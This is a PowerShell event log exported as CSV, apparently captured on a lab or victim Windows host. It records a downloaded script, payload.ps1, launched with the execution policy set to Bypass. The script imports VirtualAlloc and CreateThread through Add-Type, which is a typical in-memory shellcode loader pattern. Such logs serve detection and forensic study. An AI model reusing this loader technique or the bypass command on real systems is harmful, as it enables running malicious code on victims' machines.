Level,Date and Time,Source,Event ID,Task Category
Information,11/3/2025 1:26:39 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
. 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=17

	UserId=WIN-SIVMS1G7J74\Administrator
	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
	PipelineId=23
	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
	CommandLine=$KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
 

Details: 
CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
ParameterBinding(Add-Type): name=""Name""; value=""Win32""
ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
ParameterBinding(Add-Type): name=""PassThru""; value=""True""
"
Information,11/3/2025 1:26:30 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
. 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=15

	UserId=WIN-SIVMS1G7J74\Administrator
	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
	PipelineId=20
	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
	CommandLine=$KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
 

Details: 
CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
ParameterBinding(Add-Type): name=""Name""; value=""Win32""
ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
ParameterBinding(Add-Type): name=""PassThru""; value=""True""
"
Information,11/3/2025 1:24:47 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=15f8030a-eb8d-4cda-8480-f1837646d18c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:43 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=20

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=59352eac-85d1-4818-8e70-8815600bc82e
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=5.1.17763.2931
	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:43 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
. 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=18

	UserId=WIN-SIVMS1G7J74\Administrator
	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=59352eac-85d1-4818-8e70-8815600bc82e
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=5.1.17763.2931
	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
	PipelineId=1
	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
	CommandLine=$ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
 

Details: 
CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
ParameterBinding(Add-Type): name=""Name""; value=""Win32""
ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
ParameterBinding(Add-Type): name=""PassThru""; value=""True""
"
Information,11/3/2025 1:23:43 AM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=59352eac-85d1-4818-8e70-8815600bc82e
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=5.1.17763.2931
	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
	PipelineId=5
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
